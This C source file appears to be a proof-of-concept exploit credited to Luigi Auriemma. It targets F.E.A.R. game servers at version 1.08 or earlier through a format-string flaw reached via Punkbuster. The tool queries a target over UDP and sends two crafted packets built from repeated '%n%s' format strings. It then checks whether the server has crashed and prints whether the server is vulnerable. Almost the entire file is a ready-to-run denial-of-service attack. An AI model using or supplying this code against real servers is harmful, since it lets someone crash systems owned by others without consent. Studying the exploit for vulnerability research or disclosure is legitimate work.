/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdarg.h>

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
    #define sleep   Sleep
    #define ONESEC  1000
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>

    #define ONESEC  1
    #define stristr strcasestr
#endif

typedef uint8_t     u8;
typedef uint16_t    u16;
typedef uint32_t    u32;



#define VER         "0.1"
#define PORT        27888
#define GS2_QUERY   "\xfe\xfd\x00" "\x00\x00\x00\x00" "\xff\x00\x00" 
"\x00"
#define FSTRING     "%n%s%n%s%n%s%n%s%n%s%n%s"
#define FEARFSPB1   "\xff\xff\xff\xff" "PB_Y" FSTRING
#define FEARFSPB2   "\xff\xff\xff\xff" "PB_U" "\xff\xff\xff\xff" \
                    "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0" \
                    "127.0.0.1:1234;" FSTRING ";"




int gs_handle_info(u8 *data, int datalen, int nt, int chr, int front, 
int rear, ...);
int send_recv(int sd, u8 *in, int insz, u8 *out, int outsz, struct 
sockaddr_in *peer, int err);
int timeout(int sock, int secs);
u32 resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
    struct  sockaddr_in peer;
    int     sd,
            len,
            noquery = 0;
    u16     port    = PORT;
    u8      buff[8192];

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    setbuf(stdout, NULL);

    fputs("\n"
        "F.E.A.R. <= 1.08 format string exploitation through Punkbuster 
"VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    aluigi.org\n"
        "\n", stdout);

    if(argc < 2) {
        printf("\n"
            "Usage: %s <host> [port(%hu)]\n"
            "\n", argv[0], port);
        exit(1);
    }

    if(argc > 2) port = atoi(argv[2]);
    peer.sin_addr.s_addr = resolv(argv[1]);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    printf("- target   %s : %hu\n",
        inet_ntoa(peer.sin_addr), ntohs(peer.sin_port));

    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();

    printf("- query server:\n");
    len = send_recv(sd, GS2_QUERY, sizeof(GS2_QUERY) - 1, buff, 
sizeof(buff), &peer, 0);
    if(len < 0) {
        printf("- no reply received, I try to continue\n");
        noquery = 1;
    } else {
        gs_handle_info(buff, len, 0, '\0',  5, 0, NULL);
    }

    sleep(ONESEC);
    printf("- send malformed packets\n");
    len = send_recv(sd, FEARFSPB1, sizeof(FEARFSPB1) - 1, NULL, 0, 
&peer, 1);
    len = send_recv(sd, FEARFSPB2, sizeof(FEARFSPB2) - 1, NULL, 0, 
&peer, 1);

    if(noquery) {
        printf("- the server should have been crashed, check it 
manually\n");
    } else {
        printf("- wait some seconds\n");
        sleep(ONESEC * 3);

        printf("- check server:\n");
        len = send_recv(sd, GS2_QUERY, sizeof(GS2_QUERY) - 1, buff, 
sizeof(buff), &peer, 0);
        if(len < 0) {
            printf("\n  Server IS vulnerable!!!\n");
        } else {
            printf("\n  Server doesn't seem vulnerable\n");
        }
    }

    close(sd);
    return(0);
}



int gs_handle_info(u8 *data, int datalen, int nt, int chr, int front, 
int rear, ...) {
    va_list ap;
    int     i,
            args,
            found;
    u8      **parz,
            ***valz,
            *p,
            *limit,
            *par,
            *val;

    va_start(ap, rear);
    for(i = 0; ; i++) {
        if(!va_arg(ap, u8 *))  break;
        if(!va_arg(ap, u8 **)) break;
    }
    va_end(ap);

    args = i;
    parz = malloc(args * sizeof(u8 *));
    valz = malloc(args * sizeof(u8 **));

    va_start(ap, rear);
    for(i = 0; i < args; i++) {
        parz[i]  = va_arg(ap, u8 *);
        valz[i]  = va_arg(ap, u8 **);
        *valz[i] = NULL;
    }
    va_end(ap);

    found  = 0;
    limit  = data + datalen - rear;
    *limit = 0;
    data   += front;
    par    = NULL;
    val    = NULL;

    for(p = data; (data < limit) && p; data = p + 1, nt++) {
        p = strchr(data, chr);
        if(p) *p = 0;

        if(nt & 1) {
            if(!par) continue;
            val = data;
            printf("  %30s %s\n", par, val);

            for(i = 0; i < args; i++) {
                if(!stricmp(par, parz[i])) *valz[i] = val;
            }
        } else {
            par = data;
        }
    }

    free(parz);
    free(valz);
    return(found);
}



int send_recv(int sd, u8 *in, int insz, u8 *out, int outsz, struct 
sockaddr_in *peer, int err) {
    int     retry,
            len;

    if(in && !out) {
        if(sendto(sd, in, insz, 0, (struct sockaddr *)peer, 
sizeof(struct sockaddr_in))
          < 0) std_err();
        return(0);
    }
    if(in) {
        for(retry = 2; retry; retry--) {
            if(sendto(sd, in, insz, 0, (struct sockaddr *)peer, 
sizeof(struct sockaddr_in))
              < 0) std_err();
            if(!timeout(sd, 1)) break;
        }

        if(!retry) {
            if(!err) return(-1);
            printf("\nError: socket timeout, no reply received\n\n");
            exit(1);
        }
    } else {
        if(timeout(sd, 3) < 0) return(-1);
    }

    len = recvfrom(sd, out, outsz, 0, NULL, NULL);
    if(len < 0) std_err();
    return(len);
}



int timeout(int sock, int secs) {
    struct  timeval tout;
    fd_set  fd_read;

    tout.tv_sec  = secs;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    if(select(sock + 1, &fd_read, NULL, NULL, &tout)
      <= 0) return(-1);
    return(0);
}



u32 resolv(char *host) {
    struct  hostent *hp;
    u32     host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u32 *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif



